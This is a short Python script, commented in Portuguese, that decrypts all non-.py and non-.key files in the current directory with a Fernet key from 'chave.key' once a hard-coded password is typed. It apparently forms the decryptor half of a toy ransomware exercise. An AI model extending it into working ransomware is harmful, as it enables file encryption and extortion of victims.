# --- Importar as bilbiotecas --- #
import os
from cryptography.fernet import Fernet


def decriptar() -> None:
    """Função que faz a decriptação dos arquivos."""
    # --- Lisra com os arquivos do diretório --- #
    arquivos = []

    # --- Obter todos os arquivos presentes no diretório --- #
    for arquivo in os.listdir():
        # --- Verificar se o arquivos não é o código nem a chave --- #
        if '.py' in arquivo or '.key' in arquivo:
            continue
        if os.path.isfile(arquivo):
            arquivos.append(arquivo)

    # --- Obter a chave --- #
    with open('chave.key', 'rb') as c:
        chave = c.read()

    # --- Gerar uma senha para decriptar os arquivos --- #
    senha = 'mamonas assassinas'

    # --- Pedir para que o usuário digite a senha correta --- #
    senha_usuario = input('Digite a senha para decriptar os arquivos: ')

    # --- Decriptar os arquivos --- #
    if senha_usuario == senha:
        for arquivo in arquivos:
            with open(arquivo, 'rb') as txt:
                conteudo = txt.read()
            conteudo_decriptado = Fernet(chave).decrypt(conteudo)
            with open(arquivo, 'wb') as txt:
                txt.write(conteudo_decriptado)
        print('Seus arquivos foram decriptados!')
    else:
        print('Senha incorreta! Seus arquivos continuam encriptados!')
